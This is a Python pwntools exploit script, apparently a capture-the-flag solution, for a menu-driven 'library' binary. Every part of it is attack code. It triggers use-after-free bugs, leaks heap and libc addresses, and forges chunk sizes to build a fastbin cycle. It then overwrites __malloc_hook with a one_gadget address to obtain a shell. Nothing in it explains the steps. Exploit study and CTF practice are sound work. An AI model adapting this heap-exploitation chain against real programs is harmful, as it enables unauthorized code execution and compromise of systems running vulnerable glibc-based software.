from pwn import *

gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
debug=1
if debug:
	p = process('./library')
	libc= ELF('/lib/x86_64-linux-gnu/libc.so.6')
	context.log_level='debug'

def add(title,section_num,section_name,length,content):
	p.sendlineafter("4. exit\n",'1')
	p.sendlineafter("title:\n",title)
	p.sendlineafter("How many sections\n",str(section_num))
	p.sendlineafter("input section name\n",section_name)
	p.sendlineafter("what's the section length:\n",str(length))
	p.sendlineafter("what's the section content:\n",content)

def check():
	p.sendlineafter("4. exit\n",'2')


def dele(title):
	p.sendlineafter("4. exit\n",'3')
	p.sendafter("title:\n",title)
	

def read_book(title,flag1,flag2,section_name=0,length=0,content=0):
	data = 0
	p.sendlineafter("4. exit\n",'3')
	p.sendlineafter("what's the book's title you want to read at library?\n",title)
	p.recvuntil("reading...\n"*3)
	if flag1:
		data = p.recvline()[:-1]
	if flag2:
		p.sendlineafter("DO you want to take a note?\n",'Y')
		p.sendlineafter("input section name\n",section_name)
		p.sendlineafter("what's the section length:\n",str(length))
		p.sendafter("what's the section content:\n",content)
	else:
		p.sendlineafter("DO you want to take a note?\n",'N')
	return data

def borrow(title):
	p.sendlineafter("4. exit\n",'1')
	p.sendlineafter("what's the book's title you want to borrow?\n",title)

def back(title):
	p.sendlineafter("4. exit\n",'2')
	p.sendlineafter("what's the book's title you want to give back?\n",title)


p.sendlineafter("choose your id:\n",'0')
add('book0',1,'xnuca',256,'%17$p')#add 0
add('book1',1,'sec1',256,'chapter1')#add 1

p.sendlineafter("4. exit\n",'4')
#---------------------------------------------------------
p.sendlineafter("choose your id:\n",'1')

read_book('book1',0,1,'sec1',0x30,'chapter\n') #read_book 1 ;add section
borrow('book1')
back('book1') #free #1's book_node,section_head
read_book('\x00',0,1,'sec1',0x38,'1'*40)#new content use #1's booknode
p.sendlineafter("4. exit\n",'4')
#----------------------------------------------------------

p.sendlineafter("choose your id:\n",'0')
check()

p.recvuntil("Oh,")
heap_addr = u64(p.recvuntil(' ')[:-1][40:].ljust(8,'\x00'))
log.info('heap_addr:%#x',heap_addr)

add('book2',1,'sec1',256,'chapter1')#add 2

p.sendlineafter("4. exit\n",'4')

#---------------------------------------------------------
p.sendlineafter("choose your id:\n",'1')

read_book('book2',0,1,'sec1',0x30,'chapter\n') #read_book 2 ;add section
borrow('book2')
back('book2') #free #2's book_node,section_head

read_book('\x00',0,1,'sec1',0x38,'1'.ljust(16,'\x00')+p64(1)+p64(heap_addr)+p64(0)+p64(0x603150))#new content use #2's booknode
p.sendlineafter("4. exit\n",'4')
#----------------------------------------------------------
p.sendlineafter("choose your id:\n",'0')

check()

p.recvuntil("Oh,")
stdout = u64(p.recvuntil('\x7f').ljust(8,'\x00'))
log.info('stdout:%#x',stdout)
libc_addr = stdout-libc.symbols['_IO_2_1_stdout_']
malloc_hook = libc_addr+libc.symbols['__malloc_hook']

add('\x32',1,'xnuca',256,'%17$p')#add 0
add('book1',1,'sec1',256,'1'*0x18+p64(0x21))#add 1
add('\x32',1,'sec1',256,'1'*0x18+p64(0x21))#add 2
add('book3',1,'sec1',256,'1'*0x18+p64(0x21))#add 3

p.sendlineafter("4. exit\n",'4')

#---------------------------------------------------------


p.sendlineafter("choose your id:\n",'1')
read_book('book1',0,1,'sec1',0x30,'chapter') #read_book 1;add section
borrow('book1')
back('book1') #free #1's book_node,section_head
read_book('\x32',0,1,'sec1',0x38,'1'.ljust(16,'\x00')+p64(1)+p64(heap_addr+0x7c0)+p64(1)+p64(0)*2+p64(0x71))#change #1 section_head's size to 0x71

back('1')#fastbin 0x70->#1 section_head;fastbin 0x20->#1 section_head

read_book('book3',0,1,'sec1',0x30,'chapter') #read_book 2;add section
borrow('book3')
back('book3') #free #3's book_node,section_head

read_book('\x32',0,1,'sec1',0x38,'0'.ljust(16,'\x00')+p64(0)+p64(heap_addr+0xb00)+p64(1)+p64(heap_addr+0x7c0-0x40)+p64(0)+p64(0x71))

back('0')

back('chapter')#fastbin 0x70->#1 section_head->#3 section_head->#1 section_head

read_book('\x00',0,1,'sec1',0x68,p64(malloc_hook-0x23))#fastbin 0x70->#3 section_head->#1 section_head->malloc_hook-0x23
read_book('\x00',0,1,'sec1',0x68,'chapter')#fastbin 0x70->#1 section_head->malloc_hook-0x23
read_book('\x00',0,1,'sec1',0x68,'chapter')#fastbin 0x70->malloc_hook-0x23
read_book('\x00',0,1,'sec1',0x68,'a'*0x13+p64(libc_addr+gadget[1]))


p.sendlineafter("4. exit\n",'4')
p.sendlineafter("choose your id:\n",'0')
p.sendlineafter("4. exit\n",'1')


p.interactive()


